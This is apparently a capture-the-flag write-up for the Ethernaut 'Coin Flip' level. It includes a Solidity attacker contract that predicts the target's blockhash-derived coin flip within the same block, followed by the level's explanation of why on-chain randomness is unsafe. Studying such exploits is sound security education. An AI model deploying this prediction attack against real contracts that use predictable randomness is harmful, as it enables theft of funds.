# 3. Coin Flip
**guess the correct outcome 10 times in a row**

the contract uses 
```
	uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
```

by creating an interface contract on remix to interact with the contract:

CoinGuess.sol
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool _guess) external returns (bool);
}

contract CoinGuess {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address coinflipAddress;

    function setCoinFlipAddr(address _coinflipAddress) public {
       coinflipAddress = _coinflipAddress;
    }
    
    function _flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return ICoinFlip(coinflipAddress).flip(side);
    }
    
}
```
it is possible to find the flip value and flip in the same block
![[Pasted image 20211029152912.png]]

**end**

	Level completed!

	Difficulty 3/10

	Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

	To get cryptographically proven random numbers, you can use Chainlink VRF, which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

	Some other options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).
